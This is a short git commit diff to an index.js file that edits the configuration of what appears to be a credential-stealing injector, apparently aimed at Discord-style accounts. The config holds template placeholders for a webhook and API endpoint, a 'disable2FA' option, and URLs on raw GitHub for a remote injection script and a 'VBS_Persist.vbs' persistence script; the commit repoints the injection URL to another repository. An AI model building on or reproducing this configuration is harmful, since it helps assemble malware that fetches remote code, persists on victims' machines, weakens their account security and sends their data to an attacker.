1c09ee50e2d947c7a3fe7c729b2b476c30064fef
404log <166216396+404log@users.noreply.github.com>
2024-11-16 02:43:05 +0100

    Update index.js

--- index.js
+++ index.js
@@ -21,9 +21,8 @@ var config = {
   disable2FA: "%DISABLE_2FA%",
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
-  injection_url: "https://raw.githubusercontent.com/KSCHcuck/sub/main/index.js",
-  injector_url:
-    "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/VBS_Persist.vbs",
+  injection_url: "https://raw.githubusercontent.com/404log/couc/refs/heads/main/index.js",
+  injector_url: "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/VBS_Persist.vbs",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
